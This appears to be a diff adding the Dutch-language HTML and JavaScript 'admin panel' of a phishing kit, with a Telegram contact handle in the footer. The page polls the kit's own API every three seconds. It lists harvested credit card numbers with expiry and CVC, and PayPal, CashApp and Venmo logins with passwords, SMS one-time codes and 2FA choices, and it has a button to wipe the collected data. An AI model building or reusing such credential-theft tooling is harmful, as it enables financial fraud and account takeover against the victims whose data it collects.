@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="bamba.css">
+  <link rel="stylesheet" href="styles.css">
+  <title>Admin Panel</title>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>Admin Panel</h1>
+    </header>
+
+    <section class="sections">
+      <!-- Creditcard Gegevens -->
+      <div class="section" id="creditcard">
+        <h2>Creditcards</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>Kaarthouder Naam</th>
+              <th>Kaartnummer</th>
+              <th>Expiry</th>
+              <th>Cvc</th>
+            </tr>
+          </thead>
+          <tbody id="creditcard-body"></tbody>
+        </table>
+      </div>
+
+      <!-- PayPal Gegevens -->
+      <div class="section" id="paypal">
+        <h2>PayPal</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>Telefoon/E-mail</th>
+              <th>Wachtwoord</th>
+              <th>SMS Code</th>
+              <th>2FA Keuze</th>
+              <th>Session ID</th>
+              <th>Timestamp</th>
+            </tr>
+          </thead>
+          <tbody id="paypal-body"></tbody>
+        </table>
+      </div>
+
+      <!-- CashApp Gegevens -->
+      <div class="section" id="cashapp">
+        <h2>CashApp</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>Telefoon/E-mail</th>
+              <th>SMS</th>
+              <th>Session ID</th>
+              <th>Timestamp</th>
+            </tr>
+          </thead>
+          <tbody id="cashapp-body"></tbody>
+        </table>
+      </div>
+
+      <!-- Venmo Gegevens -->
+      <div class="section" id="venmo">
+        <h2>Venmo</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>Telefoon/E-mail</th>
+              <th>Wachtwoord</th>
+              <th>SMS Code</th>
+              <th>Session ID</th>
+              <th>Timestamp</th>
+            </tr>
+          </thead>
+          <tbody id="venmo-body"></tbody>
+        </table>
+      </div>
+    </section>
+
+    <footer>
+      <button id="clearData" class="clear-button">Verwijder Gegevens</button>
+      <p>TELEGRAM: @GIGI7BANDZ</p>
+    </footer>
+  </div>
+
+  <script>
+    function loadCreditCards() {
+      fetch('/api/getPaymentInfo')
+        .then(res => res.json())
+        .then(data => {
+          const table = document.getElementById('creditcard-body');
+          table.innerHTML = '';
+          if (Array.isArray(data)) {
+            data.forEach(entry => {
+              const row = table.insertRow();
+              row.insertCell(0).innerText = entry.cardholderName || '–';
+              row.insertCell(1).innerText = entry.cardNumber || '–';
+              row.insertCell(2).innerText = entry.expiryDate || '–';
+              row.insertCell(3).innerText = entry.cvc || '–';
+            });
+          }
+        })
+        .catch(err => console.error('Fout bij ophalen creditcards:', err));
+    }
+
+    function loadLogins() {
+      fetch('/api/getLogins')
+        .then(res => res.json())
+        .then(logins => {
+          const paypalTable = document.getElementById('paypal-body');
+          const cashappTable = document.getElementById('cashapp-body');
+          const venmoTable = document.getElementById('venmo-body');
+
+          paypalTable.innerHTML = '';
+          cashappTable.innerHTML = '';
+          venmoTable.innerHTML = '';
+
+          // Groeperen per sessionId
+          const grouped = {};
+
+          logins.forEach(login => {
+            const sessionId = login.sessionId || 'no-session';
+            if (!grouped[sessionId]) {
+              grouped[sessionId] = { sessionId: sessionId, type: login.type };
+            }
+            Object.assign(grouped[sessionId], login);
+          });
+
+          // Alle gegroepeerde logins in de juiste tabellen zetten
+          Object.values(grouped).forEach(login => {
+            const emailOrPhone = login.email || login.phoneNumber || '–';
+            const sessionId = login.sessionId || '–';
+            const timestamp = login.timestamp ? new Date(login.timestamp).toLocaleString() : '–';
+
+            if (login.type === 'paypal') {
+              const row = paypalTable.insertRow();
+              row.insertCell().innerText = emailOrPhone;
+              row.insertCell().innerText = login.password || '–';
+              row.insertCell().innerText = login.smsCode || '–';
+              row.insertCell().innerText = login.twoFAchoice || '–';
+              row.insertCell().innerText = sessionId;
+              row.insertCell().innerText = timestamp;
+            }
+
+            if (login.type === 'cashapp') {
+              const row = cashappTable.insertRow();
+              row.insertCell().innerText = emailOrPhone;
+              row.insertCell().innerText = login.smsCode || '–';
+              row.insertCell().innerText = sessionId;
+              row.insertCell().innerText = timestamp;
+            }
+
+            if (login.type === 'venmo') {
+              const row = venmoTable.insertRow();
+              row.insertCell().innerText = emailOrPhone;
+              row.insertCell().innerText = login.password || '–';
+              row.insertCell().innerText = login.smsCode || '–';
+              row.insertCell().innerText = sessionId;
+              row.insertCell().innerText = timestamp;
+            }
+          });
+        })
+        .catch(err => console.error('Fout bij ophalen logins:', err));
+    }
+
+    document.getElementById("clearData").addEventListener('click', () => {
+      if (confirm("Weet je zeker dat je alle verzamelde gegevens wilt wissen?")) {
+        fetch('/api/clearAll', { method: 'POST' })
+          .then(res => res.ok ? location.reload() : alert("Fout bij wissen."))
+          .catch(() => alert("Kon geen verbinding maken met de server."));
+      }
+    });
+
+    window.onload = () => {
+      loadCreditCards();
+      loadLogins();
+      setInterval(() => {
+        loadCreditCards();
+        loadLogins();
+      }, 3000);
+    };
+  </script>
+
+</body>
+</html>
